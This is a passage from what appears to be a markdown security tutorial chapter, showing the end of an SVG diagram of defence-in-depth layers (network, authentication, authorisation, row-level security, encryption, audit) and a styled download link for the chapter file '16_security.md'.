  <text x="410" y="395" font-size="11" fill="#333">Network → AuthN → AuthZ → RLS →</text>
  <text x="410" y="412" font-size="11" fill="#333">Encryption → Audit. Every layer counts.</text>

  <!-- Decision guide -->
  <rect x="120" y="450" width="510" height="35" rx="8" fill="#f5f5f5" stroke="#666" stroke-width="1.5"/>
  <text x="375" y="473" text-anchor="middle" font-size="11" fill="#333" font-weight="bold">Security is not a feature — it's a requirement. Build it in from day one.</text>
</svg>

---

## 15. Download

<a href="16_security.md" download="16_security.md" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#c62828,#b71c1c);color:#fff;text-decoration:none;border-radius:8px;font-weight:bold;font-size:16px;box-shadow:0 4px 15px rgba(198,40,40,0.3);margin:10px 0;">Download 16_security.md</a>
